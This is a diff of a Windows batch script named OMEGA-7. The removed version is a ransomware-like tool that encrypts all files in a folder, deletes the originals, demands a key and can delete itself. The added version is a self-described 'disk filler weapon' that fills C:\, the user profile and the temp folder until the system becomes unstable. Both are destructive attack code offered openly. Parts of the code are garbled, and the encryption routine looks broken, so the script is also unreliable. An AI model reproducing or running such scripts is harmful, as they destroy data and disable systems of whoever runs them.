@@ -1,219 +1,33 @@
 @echo off
-title OMEGA-7 // NATIVE CRYPT UTILITY
+title OMEGA-7 // DISK FILLER PROTOCOL
 color 0C
-set "MASTER_KEY=nullTrace"
 echo ========================================
-echo    OMEGA-7 NATIVE CRYPT UTILITY
-echo    [NO EXTERNAL DEPENDENCIES]
+echo    OMEGA-7 DISK FILLER WEAPON
+echo    [RESOURCE EXHAUSTION ATTACK]
 echo ========================================
 echo.
-
-:menu
-echo [1] Lock/Encrypt All Files in This Directory
-echo [2] Unlock/Decrypt All Files in This Directory
-echo [3] Quick Functionality Test
-echo [4] Exit & Self-Clean
+echo [WARNING] This will consume all disk space.
+echo [WARNING] Target VM will become unstable.
 echo.
-set /p choice="Select Operation [1-4]: "
+set /p confirm="Type 'FILL' to activate: "
+if not "%confirm%"=="FILL" exit /b
 
-if "%choice%"=="1" goto encrypt_all
-if "%choice%"=="2" goto decrypt_all
-if "%choice%"=="3" goto system_test
-if "%choice%"=="4" (
-    echo [SELF-DESTRUCT INITIATED]
-    del "%~f0" >nul 2>&1
-    exit /b
-)
-echo Invalid selection. & pause & cls & goto menu
+echo [PHASE 1] Filling C:\ root directory...
+echo. > C:\fill0.tmp 2>nul
+:loop1
+copy C:\fill0.tmp /b + C:\fill0.tmp /b C:\fill0.tmp /b >nul 2>&1
+if %errorlevel%==0 goto loop1
 
-REM ----- SYSTEM TEST: VERIFY CERTUTIL WORKS -----
-:system_test
-echo.
-echo [OMEGA-7] RUNNING SYSTEM DIAGNOSTICS...
-echo - Testing certutil availability...
-certutil -? >nul 2>&1
-if errorlevel 1 (
-    echo [FAILURE] 'certutil' command not found. Windows is corrupted.
-    pause
-    goto menu
-)
-echo [SUCCESS] Native cryptographic toolchain verified.
-echo - Creating test encryption...
-echo TEST_CONTENT > testfile.omega
-call :encrypt_single "testfile.omega" "testfile.omega.locked" "%MASTER_KEY%"
-if exist "testfile.omega.locked" (
-    echo [SUCCESS] Encryption test passed.
-    del testfile.omega testfile.omega.locked 2>nul
-) else (
-    echo [FAILURE] Encryption process failed.
-)
+echo [PHASE 2] Filling user directories...
+echo. > "%USERPROFILE%\fill1.tmp" 2>nul
+:loop2
+copy "%USERPROFILE%\fill1.tmp" /b + "%USERPROFILE%\fill1.tmp" /b "%USERPROFILE%\fill1.tmp" /b >nul 2>&1
+if %errorlevel%==0 goto loop2
+
+echo [PHASE 3] Multi-threaded fill...
+start /b "" cmd /c "echo. > C:\fill2.tmp & :loop3© C:\fill2.tmp /b + C:\fill2.tmp /b C:\fill2.tmp /b >nul && goto loop3"
+start /b "" cmd /c "echo. > "%TEMP%\fill3.tmp" & :loop4© "%TEMP%\fill3.tmp" /b + "%TEMP%\fill3.tmp" /b "%TEMP%\fill3.tmp" /b >nul && goto loop4"
+
+echo [MISSION COMPLETE] Disk exhaustion attack active.
+echo System instability imminent.
 pause
-cls
-goto menu
-
-REM ----- BULK ENCRYPTION ROUTINE -----
-:encrypt_all
-echo.
-echo [OMEGA-7] INITIATING NATIVE LOCKDOWN PROTOCOL
-echo [TARGET] All files in: %cd%
-echo [WARNING] Original files will be deleted after locking.
-echo.
-set /p confirm="Type 'CONFIRM' to proceed: "
-if /i not "%confirm%"=="CONFIRM" (
-    echo Operation cancelled.
-    pause
-    goto menu
-)
-echo [PROCEEDING] Locking files...
-echo.
-set "count=0"
-for %%f in (*) do (
-    if /i not "%%~nxf"=="%~nx0" (
-        set /a count+=1
-        echo [!count!] Processing: %%~nxf
-        call :encrypt_single "%%f" "%%f.omega" "%MASTER_KEY%"
-        if exist "%%f.omega" (
-            del "%%f" 2>nul
-            echo   Locked as: %%f.omega
-        ) else (
-            echo   [SKIPPED] File may be in use or access denied.
-        )
-    )
-)
-echo.
-if %count%==0 (
-    echo No files were processed.
-) else (
-    echo [MISSION COMPLETE] %count% files locked with NATIVE protocol.
-)
-echo [KEY REQUIRED FOR RESTORATION]
-pause
-cls
-goto menu
-
-REM ----- BULK DECRYPTION ROUTINE -----
-:decrypt_all
-echo.
-echo [OMEGA-7] INITIATING RESTORATION PROTOCOL
-echo [TARGET] All .omega files in: %cd%
-echo.
-set /p input_key="Enter Restoration Key: "
-if not "%input_key%"=="%MASTER_KEY%" (
-    echo [ACCESS DENIED] Invalid key. Operation terminated.
-    pause
-    goto menu
-)
-echo [KEY VERIFIED] Unlocking files...
-echo.
-set "count=0"
-for %%f in (*.omega) do (
-    set /a count+=1
-    echo [!count!] Processing: %%~nxf
-    call :decrypt_single "%%f" "%%~nf" "%MASTER_KEY%"
-    if exist "%%~nf" (
-        del "%%f" 2>nul
-        echo   Restored to: %%~nf
-    ) else (
-        echo   [FAILED] File may be corrupted.
-    )
-)
-echo.
-if %count%==0 (
-    echo No .omega files found to restore.
-) else (
-    echo [MISSION COMPLETE] %count% files restored.
-)
-pause
-cls
-goto menu
-
-REM ----- SINGLE FILE ENCRYPTION SUBROUTINE -----
-:encrypt_single
-set "input_file=%~1"
-set "output_file=%~2"
-set "key=%~3"
-
-REM Step 1: Base64 encode the file
-certutil -encode "%input_file%" "%temp%\temp_base64.txt" >nul 2>&1
-
-REM Step 2: Apply XOR cipher using the key (simple character shifting)
-setlocal enabledelayedexpansion
-if exist "%temp%\temp_base64.txt" (
-    <"%temp%\temp_base64.txt" (
-        for /l %%n in (0,1,8191) do (
-            set /p "line="
-            if defined line (
-                set "result="
-                set "key_index=0"
-                for /l %%i in (0,1,8191) do (
-                    if "!line:~%%i,1!"=="" goto :done_chars
-                    set "char=!line:~%%i,1!"
-                    set "key_char=!key:~!key_index!,1!"
-                    if "!key_char!"=="" set "key_char=!key:~0,1!" & set key_index=0
-                    set /a "val=( ( !key_char! + %%i ) %% 255 )"
-                    set "result=!result!!val!:"
-                    set /a key_index+=1
-                )
-                :done_chars
-                echo !result!
-            )
-        )
-    ) > "%temp%\temp_encoded.txt"
-)
-
-REM Step 3: Create final output file
-if exist "%temp%\temp_encoded.txt" (
-    echo [OMEGA7 NATIVE ENCRYPTION] > "%output_file%"
-    echo KeyHash: %key% >> "%output_file%"
-    type "%temp%\temp_encoded.txt" >> "%output_file%" 2>nul
-)
-
-REM Step 4: Cleanup temporary files
-del "%temp%\temp_base64.txt" "%temp%\temp_encoded.txt" 2>nul
-endlocal
-exit /b
-
-REM ----- SINGLE FILE DECRYPTION SUBROUTINE -----
-:decrypt_single
-set "input_file=%~1"
-set "output_file=%~2"
-set "key=%~3"
-
-REM Step 1: Remove header and extract encoded data
-more +2 "%input_file%" > "%temp%\temp_encoded.txt" 2>nul
-
-REM Step 2: Reverse XOR cipher using the key
-setlocal enabledelayedexpansion
-if exist "%temp%\temp_encoded.txt" (
-    <"%temp%\temp_encoded.txt" (
-        for /l %%n in (0,1,8191) do (
-            set /p "line="
-            if defined line (
-                set "result="
-                set "key_index=0"
-                for %%v in (!line::= !) do (
-                    if "%%v"=="" goto :done_values
-                    set "key_char=!key:~!key_index!,1!"
-                    if "!key_char!"=="" set "key_char=!key:~0,1!" & set key_index=0
-                    set /a "char_val=( %%v - !key_index! ) %% 255"
-                    if !char_val! lss 0 set /a char_val+=255
-                    cmd /c exit !char_val!
-                    set "result=!result!!=exitcodeascii!"
-                    set /a key_index+=1
-                )
-                :done_values
-                echo !result!
-            )
-        )
-    ) > "%temp%\temp_base64.txt"
-)
-
-REM Step 3: Base64 decode back to original file
-if exist "%temp%\temp_base64.txt" (
-    certutil -decode "%temp%\temp_base64.txt" "%output_file%" >nul 2>&1
-)
-
-REM Step 4: Cleanup temporary files
-del "%temp%\temp_base64.txt" "%temp%\temp_encoded.txt" 2>nul
-endlocal
-exit /b
